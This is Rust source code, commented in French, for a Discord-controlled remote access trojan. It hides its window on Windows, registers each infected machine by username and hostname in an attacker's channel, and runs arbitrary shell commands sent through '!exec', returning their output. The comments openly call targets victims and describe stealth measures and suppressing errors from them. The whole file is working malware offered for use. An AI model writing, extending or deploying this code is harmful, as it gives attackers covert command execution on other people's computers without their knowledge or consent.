#![cfg_attr(windows, windows_subsystem = "windows")]

use serenity::all::{ChannelId, Context, EventHandler, GatewayIntents, Message, Ready};
use serenity::{async_trait, Client};
use single_instance::SingleInstance;

use tokio::process::Command;
use tokio::time::{timeout, Duration};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

struct Handler;

const REPORT_CHANNEL_ID: u64 = "ID_CHANNEL";

// Fonction pour générer l'ID unique de chaque victime
fn get_machine_id() -> String {
    let username = whoami::username();
    let hostname = whoami::hostname();
    format!("{}@{}", username.trim(), hostname.trim())
}

#[async_trait]
impl EventHandler for Handler {

    // ce lance des que la victime lance le programme
    async fn ready(&self, ctx: Context, ready: Ready) {
        let os = std::env::consts::OS;
        let my_id = get_machine_id();
        let msg = format!(
        "**SESSION OUVERTE**\n ID: `{}`\n OS: `{}`\n En ligne.",
            my_id, os
        );

        let channel = ChannelId::new(REPORT_CHANNEL_ID);

        if let Err(_) = channel.say(&ctx.http, msg).await {
            // Silence en cas d'erreur
        }
    }



    // Cette fonction se déclenche à chaque message posté sur le serveur
    async fn message(&self, ctx: Context, msg: Message) {
        // On ignore les messages du bot lui-même (boucle infinie)
        if msg.author.bot {
            return;
        }

        let my_id = get_machine_id();
        let content = msg.content.clone();

        // commande ping qui permet de voir qu'il victime est encore la
        if content == "!ping" {
            let response = format!("Utilisateur vivant : `{}`", my_id);
            let _ = msg.channel_id.say(&ctx.http, response).await;
            return;
        }

        // Parsing : On cherche la commande "!exec"
        if msg.content.starts_with("!exec ") {
            // On récupère tout ce qu'il y a après "!exec "
            let parts: Vec<&str> = content.split_whitespace().collect();

            if parts.len() < 3 {
                return; 
            }

            let target_id = parts[1];

            if target_id != "all" && target_id != my_id {
                return;
            }

            let command_to_run = parts[2..].join(" ");

            let mut command;
            
            if cfg!(target_os = "windows") {
                command = Command::new("cmd");
                command.args(["/C", &command_to_run]);
                
                // On ajoute le flag CREATE_NO_WINDOW (0x08000000)*
                // permet d'être plus furtif sur windows
                #[cfg(target_os = "windows")]
                command.creation_flags(0x08000000);
            } else {
                command = Command::new("sh");
                command.arg("-c");
                command.arg(&command_to_run);
            }
            
            let time_limit = Duration::from_secs(10);
            
            // On lance la commande avec un chrono
            let result = timeout(time_limit, command.output()).await;

            // Traitement du résultat
            match result {
                Ok(command_result) => {
                    match command_result {
                        Ok(out) => {
                        let stdout = String::from_utf8_lossy(&out.stdout);
                        let stderr = String::from_utf8_lossy(&out.stderr);

                        let mut final_output = stdout.to_string();
                        if !stderr.is_empty() {
                            final_output.push_str("\n[ERREUR]:\n");
                            final_output.push_str(&stderr);
                        }
                        if final_output.trim().is_empty() {
                            final_output = "Exécuté (vide)".to_string();
                        }

                        // Tronquer si trop long
                        if final_output.len() > 1900 {
                            final_output = final_output[..1900].to_string();
                            final_output.push_str("\n... [Tronqué]");
                        }

                        // On répond en précisant qui répond
                        let response = format!("**Réponse de `{}`**:\n```text\n{}\n```", my_id, final_output);
                        let _ = msg.channel_id.say(&ctx.http, response).await;
                        },
                        Err(e) => {
                            // on reste silention pour pas print des erreurs a la victime
                        }
                    }
                },
                Err(_) => {
                    // le timeout a expiré
                    let response = format!("**TIMEOUT sur `{}`** : La commande a pris plus de 10s, je l'ai tuée pour survivre.", my_id);
                    let _ = msg.channel_id.say(&ctx.http, response).await;
                }
            }
        }
    }
}

#[tokio::main]
async fn main() {

    let instance = SingleInstance::new("discord_c2_mutex_lock_v1").unwrap();

    if !instance.is_single() {
        return;
    }

    let token = "DISCORD_TOKEN";
    // Configuration des "Intents" (Ce que le bot a le droit d'écouter)
    // GUILD_MESSAGES : Recevoir les messages
    // MESSAGE_CONTENT : Lire le TEXTE des messages
    let intents = GatewayIntents::GUILD_MESSAGES | GatewayIntents::MESSAGE_CONTENT;

    // Création du client
    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .await
        .expect("Erreur lors de la création du client");

    // Lancement de la boucle infinie
    if let Err(why) = client.start().await {
        // on reste silention pour pas print des erreurs a la victime
    }
}